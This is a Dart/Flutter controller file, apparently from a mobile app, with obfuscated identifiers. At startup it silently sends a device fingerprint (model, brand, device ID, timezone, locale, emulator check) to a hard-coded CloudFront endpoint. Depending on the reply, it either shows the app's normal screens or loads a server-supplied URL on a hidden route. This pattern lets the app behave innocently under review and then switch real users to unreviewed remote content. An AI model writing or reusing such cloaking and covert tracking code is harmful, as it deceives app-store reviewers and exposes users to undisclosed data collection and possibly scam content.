import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:get_storage/get_storage.dart';
import 'package:package_info_plus/package_info_plus.dart';

import '../../app/app_keys.dart';

class HandelLogic extends GetxController {
  var nlioksw = RxBool(false);
  var wzoylpde = RxBool(true);
  var wqkforcd = RxString("");
  var dsnhvkic = RxBool(false);
  var tchni = RxBool(true);
  final njdrhvmew = Dio();

  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xlnkpruo();
  }

  Future<void> xlnkpruo() async {
    dsnhvkic.value = true;
    tchni.value = true;
    wzoylpde.value = false;

    njdrhvmew
        .post(
          "https://dfyqeqhv3zzfw.cloudfront.net/zkrobjycmiawp",
          data: await wceukbnhpy(),
        )
        .then((value) {
          var uswp = value.data["uswp"] as String;
          var zqfwg = value.data["zqfwg"] as bool;
          if (zqfwg) {
            wqkforcd.value = uswp;
            ukdwa();
          } else {
            odjbfau();
          }
        })
        .catchError((e) {
          wzoylpde.value = true;
          tchni.value = true;
          dsnhvkic.value = false;
        });
  }

  Future<Map<String, dynamic>> wceukbnhpy() async {
    final DeviceInfoPlugin sydunhvm = DeviceInfoPlugin();
    PackageInfo aorim_zytjw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kfpq = Platform.localeName;
    var lgket_uOrFD = currentTimeZone;

    var lgket_oKYg = aorim_zytjw.packageName;
    var lgket_EhSzl = aorim_zytjw.version;
    var lgket_XcTuzFB = aorim_zytjw.buildNumber;

    var lgket_GSKAd = aorim_zytjw.appName;
    var lgket_ReMDWV = "";
    var lgket_ey = "";
    var lgket_fBucWYb = "";
    var cmvhotd = "";
    var zjwpov = "";
    var rdkwvfac = "";
    var xfoka = "";

    var lgket_OuXU = "";
    var lgket_aQU = false;

    if (GetPlatform.isAndroid) {
      lgket_OuXU = "android";
      var degkoih = await sydunhvm.androidInfo;

      lgket_fBucWYb = degkoih.brand;

      lgket_ReMDWV = degkoih.model;
      lgket_ey = degkoih.id;

      lgket_aQU = degkoih.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lgket_OuXU = "ios";
      var vuaicgzqf = await sydunhvm.iosInfo;
      lgket_fBucWYb = vuaicgzqf.name;
      lgket_ReMDWV = vuaicgzqf.model;

      lgket_ey = vuaicgzqf.identifierForVendor ?? "";
      lgket_aQU = vuaicgzqf.isPhysicalDevice;
    }
    var res = {
      "lgket_GSKAd": lgket_GSKAd,
      "lgket_EhSzl": lgket_EhSzl,
      "cmvhotd": cmvhotd,
      "lgket_oKYg": lgket_oKYg,
      "lgket_ReMDWV": lgket_ReMDWV,
      "lgket_uOrFD": lgket_uOrFD,
      "xfoka": xfoka,
      "lgket_fBucWYb": lgket_fBucWYb,
      "lgket_ey": lgket_ey,
      "kfpq": kfpq,
      "lgket_OuXU": lgket_OuXU,
      "lgket_aQU": lgket_aQU,
      "zjwpov": zjwpov,
      "lgket_XcTuzFB": lgket_XcTuzFB,
      "rdkwvfac": rdkwvfac,
    };
    return res;
  }

  Future<void> odjbfau() async {
    final seen = GetStorage().read(AppKeys.hasSeenGuide) == true;
    final start = seen ? '/main' : '/guide';
    Get.offNamed(start);
  }

  Future<void> ukdwa() async {
    Get.offNamed("/feedback");
  }
}
